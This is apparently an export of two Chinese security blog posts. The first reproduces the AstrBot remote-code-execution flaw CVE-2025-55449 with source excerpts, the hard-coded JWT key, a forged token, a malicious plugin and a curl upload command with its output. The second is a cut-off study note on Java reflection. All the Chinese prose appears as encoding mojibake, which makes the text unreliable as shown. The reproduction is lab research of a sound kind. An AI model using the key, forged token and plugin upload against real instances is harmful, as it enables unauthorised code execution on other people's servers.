[{"content":"AstrBot è¿œç¨‹ä»£ç æ‰§è¡Œ(CVE-2025-55449)æ¼æ´å¤ç°\rAstrBot æ˜¯ä¸€ä¸ªå¼€æºçš„ä¸€ç«™å¼ Agent èŠå¤©æœºå™¨äººå¹³å°åŠå¼€å‘æ¡†æ¶ã€‚\nä¸»è¦åŠŸèƒ½\rå¤§æ¨¡å‹å¯¹è¯ã€‚æ”¯æŒæ¥å…¥å¤šç§å¤§æ¨¡å‹æœåŠ¡ã€‚æ”¯æŒå¤šæ¨¡æ€ã€å·¥å…·è°ƒç”¨ã€MCPã€åŸç”ŸçŸ¥è¯†åº“ã€äººè®¾ç­‰åŠŸèƒ½ã€‚ å¤šæ¶ˆæ¯å¹³å°æ”¯æŒã€‚æ”¯æŒæ¥å…¥ QQã€ä¼ä¸šå¾®ä¿¡ã€å¾®ä¿¡å…¬ä¼—å·ã€é£ä¹¦ã€Telegramã€é’‰é’‰ã€Discordã€KOOK ç­‰å¹³å°ã€‚æ”¯æŒé€Ÿç‡é™åˆ¶ã€ç™½åå•ã€ç™¾åº¦å†…å®¹å®¡æ ¸ã€‚ Agentã€‚å®Œå–„é€‚é…çš„ Agentic èƒ½åŠ›ã€‚æ”¯æŒå¤šè½®å·¥å…·è°ƒç”¨ã€å†…ç½®æ²™ç›’ä»£ç æ‰§è¡Œå™¨ã€ç½‘é¡µæœç´¢ç­‰åŠŸèƒ½ã€‚ æ’ä»¶æ‰©å±•ã€‚æ·±åº¦ä¼˜åŒ–çš„æ’ä»¶æœºåˆ¶ï¼Œæ”¯æŒå¼€å‘æ’ä»¶æ‰©å±•åŠŸèƒ½ï¼Œç¤¾åŒºæ’ä»¶ç”Ÿæ€ä¸°å¯Œã€‚ WebUIã€‚å¯è§†åŒ–é…ç½®å’Œç®¡ç†æœºå™¨äººï¼ŒåŠŸèƒ½é½å…¨ã€‚ æ¼æ´æè¿°\rè¿‘æ—¥ï¼Œå¥‡å®‰ä¿¡CERTç›‘æµ‹åˆ°å®˜æ–¹ä¿®å¤AstrBot è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2025-55449)ï¼Œè¯¥æ¼æ´æºäº AstrBot ä½¿ç”¨äº†å›ºå®šçš„ JWT ç­¾åå¯†é’¥ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨è¯¥å¯†é’¥ä¼ªé€ ä»»æ„æœ‰æ•ˆçš„ JWT è®¤è¯ä»¤ç‰Œï¼Œå®Œå…¨ç»•è¿‡èº«ä»½éªŒè¯æœºåˆ¶ã€‚æˆåŠŸç»•è¿‡è®¤è¯åï¼Œæ”»å‡»è€…å¯è®¿é—®æ’ä»¶ç®¡ç†æ¥å£ï¼Œé€šè¿‡ä¸Šä¼ æ¶æ„çš„ Python æ’ä»¶æ–‡ä»¶å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œã€‚**ç›®å‰è¯¥æ¼æ´POCå’ŒæŠ€æœ¯ç»†èŠ‚å·²åœ¨äº’è”ç½‘ä¸Šå…¬å¼€ï¼Œ**é‰´äºè¯¥æ¼æ´å½±å“èŒƒå›´è¾ƒå¤§ï¼Œå»ºè®®å®¢æˆ·å°½å¿«åšå¥½è‡ªæŸ¥åŠé˜²æŠ¤ã€‚\nå½±å“ç‰ˆæœ¬\rAstrBot \u0026lt; 3.5.18\næˆ‘ä»¬è¿™é‡Œä½¿ç”¨ 3.5.17æ¥å¤ç°\næ¼æ´åˆ†æ\rå…ˆçœ‹çœ‹æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 // astrbot/dashboard/routes/auth.py import jwt import datetime import asyncio from .route import Route, Response, RouteContext from quart import request from astrbot.core import WEBUI_SK, DEMO_MODE from astrbot import logger class AuthRoute(Route): def __init__(self, context: RouteContext) -\u0026gt; None: super().__init__(context) self.routes = { \u0026#34;/auth/login\u0026#34;: (\u0026#34;POST\u0026#34;, self.login), \u0026#34;/auth/account/edit\u0026#34;: (\u0026#34;POST\u0026#34;, self.edit_account), } self.register_routes() async def login(self): username = self.config[\u0026#34;dashboard\u0026#34;][\u0026#34;username\u0026#34;] password = self.config[\u0026#34;dashboard\u0026#34;][\u0026#34;password\u0026#34;] post_data = await request.json if post_data[\u0026#34;username\u0026#34;] == username and post_data[\u0026#34;password\u0026#34;] == password: change_pwd_hint = False if ( username == \u0026#34;astrbot\u0026#34; and password == \u0026#34;77b90590a8945a7d36c963981a307dc9\u0026#34; and not DEMO_MODE ): change_pwd_hint = True logger.warning(\u0026#34;ä¸ºäº†ä¿è¯å®‰å…¨ï¼Œè¯·å°½å¿«ä¿®æ”¹é»˜è®¤å¯†ç ã€‚\u0026#34;) return ( Response() .ok( { \u0026#34;token\u0026#34;: self.generate_jwt(username), \u0026#34;username\u0026#34;: username, \u0026#34;change_pwd_hint\u0026#34;: change_pwd_hint, } ) .__dict__ ) else: await asyncio.sleep(3) return Response().error(\u0026#34;ç”¨æˆ·åæˆ–å¯†ç é”™è¯¯\u0026#34;).__dict__ async def edit_account(self): if DEMO_MODE: return ( Response() .error(\u0026#34;You are not permitted to do this operation in demo mode\u0026#34;) .__dict__ ) password = self.config[\u0026#34;dashboard\u0026#34;][\u0026#34;password\u0026#34;] post_data = await request.json if post_data[\u0026#34;password\u0026#34;] != password: return Response().error(\u0026#34;åŸå¯†ç é”™è¯¯\u0026#34;).__dict__ new_pwd = post_data.get(\u0026#34;new_password\u0026#34;, None) new_username = post_data.get(\u0026#34;new_username\u0026#34;, None) if not new_pwd and not new_username: return ( Response().error(\u0026#34;æ–°ç”¨æˆ·åå’Œæ–°å¯†ç ä¸èƒ½åŒæ—¶ä¸ºç©ºï¼Œä½ æ”¹äº†ä¸ªå¯‚å¯\u0026#34;).__dict__ ) if new_pwd: self.config[\u0026#34;dashboard\u0026#34;][\u0026#34;password\u0026#34;] = new_pwd if new_username: self.config[\u0026#34;dashboard\u0026#34;][\u0026#34;username\u0026#34;] = new_username self.config.save_config() return Response().ok(None, \u0026#34;ä¿®æ”¹æˆåŠŸ\u0026#34;).__dict__ def generate_jwt(self, username): payload = { \u0026#34;username\u0026#34;: username, \u0026#34;exp\u0026#34;: datetime.datetime.utcnow() + datetime.timedelta(days=7), } token = jwt.encode(payload, WEBUI_SK, algorithm=\u0026#34;HS256\u0026#34;) # æ¼æ´ç‚¹ return token å¯ä»¥çœ‹åˆ°ï¼š\ntoken = jwt.encode(payload, WEBUI_SK, algorithm=\u0026ldquo;HS256\u0026rdquo;)\nè¿™é‡Œä½¿ç”¨äº†WEBUI_SKæ¥åŠ å¯†ç”Ÿæˆjwt token\nåˆfrom astrbot.core import WEBUI_SK, DEMO_MODEå¯¼å…¥äº†WEBUI_SKï¼Œæ‰¾æ‰¾çœ‹ï¼Œç„¶åæ‰¾åˆ°è¿™é‡Œï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 // astrbot/core/__init__.py import os import asyncio from .log import LogManager, LogBroker # noqa from astrbot.core.utils.t2i.renderer import HtmlRenderer from astrbot.core.utils.shared_preferences import SharedPreferences from astrbot.core.utils.pip_installer import PipInstaller from astrbot.core.db.sqlite import SQLiteDatabase from astrbot.core.config.default import DB_PATH from astrbot.core.config import AstrBotConfig from astrbot.core.file_token_service import FileTokenService from .utils.astrbot_path import get_astrbot_data_path # åˆå§‹åŒ–æ•°æ®å­˜å‚¨æ–‡ä»¶å¤¹ os.makedirs(get_astrbot_data_path(), exist_ok=True) WEBUI_SK = \u0026#34;Advanced_System_for_Text_Response_and_Bot_Operations_Tool\u0026#34; #è¿™é‡Œ DEMO_MODE = os.getenv(\u0026#34;DEMO_MODE\u0026#34;, False) astrbot_config = AstrBotConfig() t2i_base_url = astrbot_config.get(\u0026#34;t2i_endpoint\u0026#34;, \u0026#34;https://t2i.soulter.top/text2img\u0026#34;) html_renderer = HtmlRenderer(t2i_base_url) logger = LogManager.GetLogger(log_name=\u0026#34;astrbot\u0026#34;) db_helper = SQLiteDatabase(DB_PATH) # ç®€å•çš„åå¥½è®¾ç½®å­˜å‚¨, è¿™é‡Œåç»­åº”è¯¥å­˜å‚¨åˆ°æ•°æ®åº“ä¸­, ä¸€äº›éƒ¨åˆ†å¯ä»¥å­˜å‚¨åˆ°é…ç½®ä¸­ sp = SharedPreferences() # æ–‡ä»¶ä»¤ç‰ŒæœåŠ¡ file_token_service = FileTokenService() pip_installer = PipInstaller( astrbot_config.get(\u0026#34;pip_install_arg\u0026#34;, \u0026#34;\u0026#34;), astrbot_config.get(\u0026#34;pypi_index_url\u0026#34;, None), ) web_chat_queue = asyncio.Queue(maxsize=32) web_chat_back_queue = asyncio.Queue(maxsize=32) å¯ä»¥çœ‹åˆ°è¿™é‡Œç¡¬ç¼–ç äº†WEBUI_SKè¿›å»\nçœ‹çœ‹tokençš„éªŒè¯é€»è¾‘ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 // astrbot/dashboard/server.py async def srv_plug_route(self, subpath, *args, **kwargs): \u0026#34;\u0026#34;\u0026#34; æ’ä»¶è·¯ç”± \u0026#34;\u0026#34;\u0026#34; registered_web_apis = self.core_lifecycle.star_context.registered_web_apis for api in registered_web_apis: route, view_handler, methods, _ = api if route == f\u0026#34;/{subpath}\u0026#34; and request.method in methods: return await view_handler(*args, **kwargs) return jsonify(Response().error(\u0026#34;æœªæ‰¾åˆ°è¯¥è·¯ç”±\u0026#34;).__dict__) async def auth_middleware(self): if not request.path.startswith(\u0026#34;/api\u0026#34;): return allowed_endpoints = [\u0026#34;/api/auth/login\u0026#34;, \u0026#34;/api/file\u0026#34;] if any(request.path.startswith(prefix) for prefix in allowed_endpoints): return # claim jwt token = request.headers.get(\u0026#34;Authorization\u0026#34;) if not token: r = jsonify(Response().error(\u0026#34;æœªæˆæƒ\u0026#34;).__dict__) r.status_code = 401 return r if token.startswith(\u0026#34;Bearer \u0026#34;): token = token[7:] try: payload = jwt.decode(token, WEBUI_SK, algorithms=[\u0026#34;HS256\u0026#34;]) g.username = payload[\u0026#34;username\u0026#34;] except jwt.ExpiredSignatureError: r = jsonify(Response().error(\u0026#34;Token è¿‡æœŸ\u0026#34;).__dict__) r.status_code = 401 return r except jwt.InvalidTokenError: r = jsonify(Response().error(\u0026#34;Token æ— æ•ˆ\u0026#34;).__dict__) r.status_code = 401 return r åªè¦èƒ½è¢«è§£æä¸”ä¸è¿‡æœŸçš„tokenéƒ½èƒ½è¿‡éªŒè¯ï¼Œè¿™é‡Œå¯ä»¥ä¼ªé€ tokenæ¥è¶Šæƒè®¿é—®æ’ä»¶ç®¡ç†æ¥å£\nçœ‹çœ‹æ€ä¹ˆRCEï¼š\nç”±äºåº”ç”¨è‡ªå¸¦æ’ä»¶æ‰©å±•åŠŸèƒ½ï¼Œå…è®¸ç”¨æˆ·ä¸Šä¼ è‡ªå®šä¹‰æ’ä»¶åŒ…ï¼Œç¨‹åºä¼šè¿›è¡Œè§£å‹åè¯»å–æ’ä»¶ç›¸å…³çš„ä¿¡æ¯å¹¶å¯¼å…¥å¯¹è±¡çš„Pythonæ–‡ä»¶æ‰§è¡Œä»£ç ã€‚\nåœ¨ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 // astrbot/dashboard/routes/plugin.py class PluginRoute(Route): def __init__( self, context: RouteContext, core_lifecycle: AstrBotCoreLifecycle, plugin_manager: PluginManager, ) -\u0026gt; None: super().__init__(context) self.routes = { \u0026#34;/plugin/get\u0026#34;: (\u0026#34;GET\u0026#34;, self.get_plugins), \u0026#34;/plugin/install\u0026#34;: (\u0026#34;POST\u0026#34;, self.install_plugin), \u0026#34;/plugin/install-upload\u0026#34;: (\u0026#34;POST\u0026#34;, self.install_plugin_upload), # è¿™é‡Œ \u0026#34;/plugin/update\u0026#34;: (\u0026#34;POST\u0026#34;, self.update_plugin), \u0026#34;/plugin/uninstall\u0026#34;: (\u0026#34;POST\u0026#34;, self.uninstall_plugin), \u0026#34;/plugin/market_list\u0026#34;: (\u0026#34;GET\u0026#34;, self.get_online_plugins), \u0026#34;/plugin/off\u0026#34;: (\u0026#34;POST\u0026#34;, self.off_plugin), \u0026#34;/plugin/on\u0026#34;: (\u0026#34;POST\u0026#34;, self.on_plugin), \u0026#34;/plugin/reload\u0026#34;: (\u0026#34;POST\u0026#34;, self.reload_plugins), \u0026#34;/plugin/readme\u0026#34;: (\u0026#34;GET\u0026#34;, self.get_plugin_readme), \u0026#34;/plugin/platform_enable/get\u0026#34;: (\u0026#34;GET\u0026#34;, self.get_plugin_platform_enable), \u0026#34;/plugin/platform_enable/set\u0026#34;: (\u0026#34;POST\u0026#34;, self.set_plugin_platform_enable), } self.core_lifecycle = core_lifecycle self.plugin_manager = plugin_manager self.register_routes() å¯ä»¥çœ‹åˆ°/plugin/install-uploadæ˜ å°„åˆ°self.install_plugin_upload\nç„¶åä¸€æ­¥æ­¥èµ°\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 async def install_plugin_upload(self): if DEMO_MODE: return ( Response() .error(\u0026#34;You are not permitted to do this operation in demo mode\u0026#34;) .__dict__ ) try: file = await request.files file = file[\u0026#34;file\u0026#34;] logger.info(f\u0026#34;æ­£åœ¨å®‰è£…ç”¨æˆ·ä¸Šä¼ çš„æ’ä»¶ {file.filename}\u0026#34;) file_path = f\u0026#34;data/temp/{file.filename}\u0026#34; await file.save(file_path) plugin_info = await self.plugin_manager.install_plugin_from_file(file_path) #here # self.core_lifecycle.restart() logger.info(f\u0026#34;å®‰è£…æ’ä»¶ {file.filename} æˆåŠŸ\u0026#34;) return Response().ok(plugin_info, \u0026#34;å®‰è£…æˆåŠŸã€‚\u0026#34;).__dict__ except Exception as e: logger.error(traceback.format_exc()) return Response().error(str(e)).__dict__ å†è¿›install_plugin_from_fileå‡½æ•°çœ‹çœ‹\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 // astrbot/core/star/star_manager.py async def install_plugin_from_file(self, zip_file_path: str): dir_name = os.path.basename(zip_file_path).replace(\u0026#34;.zip\u0026#34;, \u0026#34;\u0026#34;) dir_name = dir_name.removesuffix(\u0026#34;-master\u0026#34;).removesuffix(\u0026#34;-main\u0026#34;).lower() desti_dir = os.path.join(self.plugin_store_path, dir_name) self.updator.unzip_file(zip_file_path, desti_dir) # remove the zip try: os.remove(zip_file_path) except BaseException as e: logger.warning(f\u0026#34;åˆ é™¤æ’ä»¶å‹ç¼©åŒ…å¤±è´¥: {e!s}\u0026#34;) # await self.reload() await self.load(specified_dir_name=dir_name) # è¿™é‡Œ # Get the plugin metadata to return repo info plugin = self.context.get_registered_star(dir_name) if not plugin: # Try to find by other name if directory name doesn\u0026#39;t match plugin name for star in self.context.get_all_stars(): if star.root_dir_name == dir_name: plugin = star break # Extract README.md content if exists readme_content = None readme_path = os.path.join(desti_dir, \u0026#34;README.md\u0026#34;) if not os.path.exists(readme_path): readme_path = os.path.join(desti_dir, \u0026#34;readme.md\u0026#34;) if os.path.exists(readme_path): try: with open(readme_path, encoding=\u0026#34;utf-8\u0026#34;) as f: readme_content = f.read() except Exception as e: logger.warning(f\u0026#34;è¯»å–æ’ä»¶ {dir_name} çš„ README.md æ–‡ä»¶å¤±è´¥: {e!s}\u0026#34;) plugin_info = None if plugin: plugin_info = { \u0026#34;repo\u0026#34;: plugin.repo, \u0026#34;readme\u0026#34;: readme_content, \u0026#34;name\u0026#34;: plugin.name, } return plugin_info æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªloadï¼Œå¾ˆç†Ÿæ‚‰ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„é‚£ä¸ªload\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 async def load(self, specified_module_path=None, specified_dir_name=None): ...... # å°è¯•å¯¼å…¥æ¨¡å— try: module = __import__(path, fromlist=[module_str]) except (ModuleNotFoundError, ImportError): # å°è¯•å®‰è£…ä¾èµ– await self._check_plugin_dept_update(target_plugin=root_dir_name) module = __import__(path, fromlist=[module_str]) except Exception as e: logger.error(traceback.format_exc()) logger.error(f\u0026#34;æ’ä»¶ {root_dir_name} å¯¼å…¥å¤±è´¥ã€‚åŸå› ï¼š{e!s}\u0026#34;) continue ...... åœ¨loadé‡Œä½¿ç”¨äº†__import__æ¥å¯¼å…¥è‡ªå®šä¹‰çš„æ’ä»¶ä»£ç æ–‡ä»¶\nRCEé“¾å°±ä¸²è”èµ·æ¥äº†ï¼ŒPluginManager.install_plugin_from_fileå‡½æ•°å°†ä¸Šä¼ çš„æ’ä»¶ä»£ç è§£å‹åäº¤ç”±loadå‡½æ•°è¿›è¡ŒåŠ è½½ï¼Œç»“åˆjwtè¶Šæƒï¼Œå¯¼è‡´æ¶æ„ä»£ç å¯èƒ½è¢«æ‰§è¡Œã€‚\næ¼æ´å¤ç°\rå…ˆå†™ä¸ªæ’ä»¶ï¼Œå¯ä»¥ç…§æ¨¡æ¿å†™ï¼Œæ‰¾ä¸€ä¸ªç½‘ä¸Šçš„ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 from astrbot.api.event import filter, AstrMessageEvent, MessageEventResult from astrbot.api.star import Context, Star, register from astrbot.api import logger @register(\u0026#34;helloworld\u0026#34;, \u0026#34;YourName\u0026#34;, \u0026#34;ä¸€ä¸ªç®€å•çš„ Hello World æ’ä»¶\u0026#34;, \u0026#34;1.0.0\u0026#34;) class MyPlugin(Star): def __init__(self, context: Context): super().__init__(context) async def initialize(self): with open(\u0026#39;tmp/success\u0026#39;, \u0026#39;w\u0026#39;) as f: f.write(\u0026#39;hacked!\u0026#39;) # æ³¨å†ŒæŒ‡ä»¤çš„è£…é¥°å™¨ã€‚æŒ‡ä»¤åä¸º helloworldã€‚æ³¨å†ŒæˆåŠŸåï¼Œå‘é€ `/helloworld` å°±ä¼šè§¦å‘è¿™ä¸ªæŒ‡ä»¤ï¼Œå¹¶å›å¤ `ä½ å¥½, {user_name}!` @filter.command(\u0026#34;helloworld\u0026#34;) async def helloworld(self, event: AstrMessageEvent): \u0026#34;\u0026#34;\u0026#34;è¿™æ˜¯ä¸€ä¸ª hello world æŒ‡ä»¤\u0026#34;\u0026#34;\u0026#34; # è¿™æ˜¯ handler çš„æè¿°ï¼Œå°†ä¼šè¢«è§£ææ–¹ä¾¿ç”¨æˆ·äº†è§£æ’ä»¶å†…å®¹ã€‚å»ºè®®å¡«å†™ã€‚ user_name = event.get_sender_name() message_str = event.message_str # ç”¨æˆ·å‘çš„çº¯æ–‡æœ¬æ¶ˆæ¯å­—ç¬¦ä¸² message_chain = event.get_messages() # ç”¨æˆ·æ‰€å‘çš„æ¶ˆæ¯çš„æ¶ˆæ¯é“¾ # from astrbot.api.message_components import * logger.info(message_chain) yield event.plain_result(f\u0026#34;Hello, {user_name}, ä½ å‘äº† {message_str}!\u0026#34;) # å‘é€ä¸€æ¡çº¯æ–‡æœ¬æ¶ˆæ¯ async def terminate(self): \u0026#34;\u0026#34;\u0026#34;å¯é€‰æ‹©å®ç°å¼‚æ­¥çš„æ’ä»¶é”€æ¯æ–¹æ³•ï¼Œå½“æ’ä»¶è¢«å¸è½½/åœç”¨æ—¶ä¼šè°ƒç”¨ã€‚\u0026#34;\u0026#34;\u0026#34; å¸¦tokenä¸Šä¼ zipï¼š\n1 2 3 4 5 6 â”Œâ”€â”€(kaliã‰¿kali)-[~/astrbot] â””â”€$ curl -X POST \\ -H \u0026#34;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFzdHJib3QiLCJleHAiOjE3NjQzNzUxMTB9.Mz9_VTb1yWP8q061MF0wVHDMG04_Oz7bKT-xFHdB3MM\u0026#34; \\ -F \u0026#34;file=@/home/kali/astrbot/helloworld-master.zip\u0026#34; \\ http://192.168.142.131:6185/api/plugin/install-upload {\u0026#34;status\u0026#34;:\u0026#34;ok\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;\\u5b89\\u88c5\\u6210\\u529f\\u3002\u0026#34;,\u0026#34;data\u0026#34;:{\u0026#34;repo\u0026#34;:\u0026#34;https://github.com/Soulter/helloworld\u0026#34;,\u0026#34;readme\u0026#34;:\u0026#34;# helloworld\\n\\nAstrBot \\u63d2\\u4ef6\\u6a21\\u677f\\n\\nA template plugin for AstrBot plugin feature\\n\\n# \\u652f\\u6301\\n\\n[\\u5e2e\\u52a9\\u6587\\u6863](https://astrbot.app)\\n\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;helloworld\u0026#34;}} å‘ç°æˆåŠŸæ‰§è¡Œäº†å‘½ä»¤ï¼š\n1 2 3 â”Œâ”€â”€(kaliã‰¿kali)-[~] â””â”€$ cat /tmp/success hacked! è¿™é‡Œæˆ‘æµ‹è¯•çš„æ—¶å€™æƒ³å¼¹shellä½†ä¸€ç›´å¼¹ä¸åˆ°ï¼Œåœ¨æ‰¾pocçš„è¿‡ç¨‹ä¸­å‘ç°äº†å†™å†…å­˜é©¬çš„æ–¹å¼ï¼Œæ„Ÿè§‰è›®æœ‰å¯å‘æ„ä¹‰çš„ï¼Œä¸è¿‡è¿™é‡Œå°±ä¸å†™äº†\nå‚è€ƒ\rã€å·²å¤ç°ã€‘AstrBot è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´(CVE-2025-55449)å®‰å…¨é£é™©é€šå‘Š\nAstrBot è¿œç¨‹ä»£ç æ‰§è¡Œ(CVE-2025-55449)æ¼æ´åˆ†æ\nCVE-2025-55449\n","date":"2025-11-22T00:00:00Z","permalink":"https://Oight.github.io/p/cve-2025-55449%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","title":"CVE-2025-55449æ¼æ´å¤ç°"},{"content":"Javaå®‰å…¨å­¦ä¹ \råªå¼€æ–°å‘ä¸å¡«æ—§å‘è¿™ä¸€å—\nåå°„\råå°„æ˜¯Javaä¸­å¾ˆé‡è¦çš„ä¸€ä¸ªç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå°„æ¥åŠ¨æ€è·å–ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰ä¿¡æ¯ã€‚\næ‰€ä»¥ï¼Œåå°„æ˜¯ä¸ºäº†è§£å†³åœ¨è¿è¡ŒæœŸï¼Œå¯¹æŸä¸ªå®ä¾‹ä¸€æ— æ‰€çŸ¥çš„æƒ…å†µä¸‹ï¼Œå¦‚ä½•è°ƒç”¨å…¶æ–¹æ³•ã€‚ â€”â€”â€”â€”å»–é›ªå³°çš„å®˜æ–¹ç½‘ç«™\næˆ‘ä»¬éƒ½çŸ¥é“Javaä½œä¸ºé¢å‘å¯¹è±¡è¯­è¨€ä¸­æœ€å…·ä»£è¡¨æ€§çš„ä¸€ä¸ªï¼Œåœ¨Javaä¸­ä¸€åˆ‡çš†å¯¹è±¡ã€‚è€Œæ¯ä¸ªå¯¹è±¡éƒ½å¯¹åº”ç€ç”¨æ¥å®ä¾‹åŒ–å®ƒçš„ç±»ã€‚\nå¦‚æœä¸ç”¨åå°„æˆ–ç±»ä¼¼çš„è¿è¡Œæ—¶å‘ç°æœºåˆ¶ï¼Œç¨‹åºå‘˜å¿…é¡»åœ¨ç¼–è¯‘æœŸ/ä»£ç ä¸­æ˜¾å¼ç»‘å®šç±»å‹ä¸å®ä¾‹åŒ–é€»è¾‘ï¼ˆå†™ newã€å†™å·¥å‚ã€å†™æ³¨å†Œä»£ç ï¼‰ï¼Œå› æ­¤æ›¿æ¢å®ç°æˆ–åŠ¨æ€åŠ è½½æ’ä»¶æ—¶éœ€è¦æ”¹å¤§é‡ä»£ç æˆ–ä¾èµ–æ„å»ºæ—¶/é…ç½®æ—¶çš„é¢å¤–æ­¥éª¤ï¼›åå°„æŠŠâ€œé€‰æ‹©å®ç°/æ–¹æ³•â€çš„æ—¶æœºä»ç¼–è¯‘æœŸå»¶ååˆ°è¿è¡ŒæœŸï¼Œä»è€Œé™ä½äº†ä»£ç è€¦åˆå’Œæ ·æ¿ï¼Œä½†ä¼šä»¥è¿è¡Œæ—¶å®‰å…¨æ€§ã€æ€§èƒ½å’Œå¯ç»´æŠ¤æ€§ä¸ºä»£ä»·ã€‚ã€‚\nJavaä¸­çš„æ³¨è§£å°±æ˜¯ä½¿ç”¨åå°„æ¥å®ç°çš„ï¼Œé€šè¿‡åå°„æ¥è·å–ç±»å¹¶éå†å„ä¸ªç±»ä¸­çš„æ–¹æ³•ï¼Œä»è€Œæ‰¾åˆ°æ‰€æœ‰æƒ³è¦çš„æ–¹æ³•å¹¶æ³¨å…¥ã€‚ä»¥Springä¸ºä¾‹ï¼Œå½“ä½ åœ¨ Spring é…ç½®æ–‡ä»¶ä¸­æˆ–è€…ä½¿ç”¨æ³¨è§£ @Autowired æ—¶ï¼Œä½ åªéœ€è¦å‘Šè¯‰ Springï¼šâ€œæˆ‘éœ€è¦ä¸€ä¸ª UserService çš„å¯¹è±¡â€ã€‚Spring å®¹å™¨åœ¨å¯åŠ¨æ—¶ï¼Œä¼šè¯»å–ä½ çš„é…ç½®ï¼Œç„¶åé€šè¿‡åå°„æœºåˆ¶ï¼ŒåŠ¨æ€åœ°æ‰¾åˆ° UserService è¿™ä¸ªç±»ï¼Œè°ƒç”¨å®ƒçš„æ„é€ å‡½æ•°åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œç„¶åæŠŠå®ƒæ³¨å…¥åˆ°ä½ éœ€è¦çš„åœ°æ–¹ã€‚ä½ å¹¶æ²¡æœ‰å†™ new UserService() è¿™è¡Œä»£ç ï¼Œæ˜¯ Spring é€šè¿‡åå°„å¸®ä½ åšäº†ã€‚\nå¦‚å¯¹è±¡åºåˆ—åŒ– / ååºåˆ—åŒ–ï¼ˆå°†å¯¹è±¡è½¬ä¸º JSON æˆ– XMLï¼‰ã€ORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰æ¡†æ¶ï¼Œéƒ½éœ€è¦åå°„æ¥å·¥ä½œã€‚\nä¸¾ä¾‹ï¼šJSON åºåˆ—åŒ–åº“ (å¦‚ Jackson, Gson)\nå½“ä½ è°ƒç”¨ new Gson().toJson(myObject) æ—¶ï¼ŒGson åº“å¹¶ä¸çŸ¥é“ myObjectå…·ä½“æ˜¯ä»€ä¹ˆç±»ï¼Œæœ‰å“ªäº›å­—æ®µã€‚å®ƒä¼šä½¿ç”¨åå°„æœºåˆ¶ï¼Œéå† myObjectå¯¹è±¡çš„æ‰€æœ‰å­—æ®µï¼ˆåŒ…æ‹¬ privateçš„ï¼‰ï¼Œè·å–å®ƒä»¬çš„åç§°å’Œå€¼ï¼Œç„¶åå°†å…¶ç»„ç»‡æˆ JSON å­—ç¬¦ä¸²ã€‚\næ€»è€Œè¨€ä¹‹ï¼Œæœ‰äº†åå°„æœºåˆ¶ï¼Œåœ¨è°ƒç”¨æŸä¸ªå¯¹è±¡çš„æ–¹æ³•æˆ–è®¿é—®å…¶å­—æ®µæ—¶ï¼Œéƒ½ä¸å†éœ€è¦çŸ¥é“è¿™ä¸ªå¯¹è±¡å¯¹åº”çš„ç±»çš„å…¨éƒ¨ä¿¡æ¯ï¼Œåªéœ€è¦æ‹¿åˆ°ä¸€ä¸ªå®ä¾‹ï¼Œå°±å¯ä»¥å°½æƒ…åœ°ä½¿ç”¨å®ƒã€‚\nJava çš„åå°„ API æä¾›äº†ä¸€ç³»åˆ—çš„ç±»å’Œæ¥å£æ¥æ“ä½œ Class å¯¹è±¡ã€‚ä¸»è¦çš„ç±»åŒ…æ‹¬ï¼š\njava.lang.Classï¼šè¡¨ç¤ºç±»çš„å¯¹è±¡ã€‚æä¾›äº†æ–¹æ³•æ¥è·å–ç±»çš„å­—æ®µã€æ–¹æ³•ã€æ„é€ å‡½æ•°ç­‰ã€‚ java.lang.reflect.Fieldï¼šè¡¨ç¤ºç±»çš„å­—æ®µï¼ˆå±æ€§ï¼‰ã€‚æä¾›äº†è®¿é—®å’Œä¿®æ”¹å­—æ®µçš„èƒ½åŠ›ã€‚ java.lang.reflect.Methodï¼šè¡¨ç¤ºç±»çš„æ–¹æ³•ã€‚æä¾›äº†è°ƒç”¨æ–¹æ³•çš„èƒ½åŠ›ã€‚ java.lang.reflect.Constructorï¼šè¡¨ç¤ºç±»çš„æ„é€ å‡½æ•°ã€‚æä¾›äº†åˆ›å»ºå¯¹è±¡çš„èƒ½åŠ›ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œåå°„çš„å·¥ä½œæµç¨‹æ˜¯ï¼šè·å–Classå¯¹è±¡=\u0026gt;è·å–æˆå‘˜ä¿¡æ¯(é€šè¿‡Classè·å–å­—æ®µã€æ–¹æ³•ã€æ„é€ 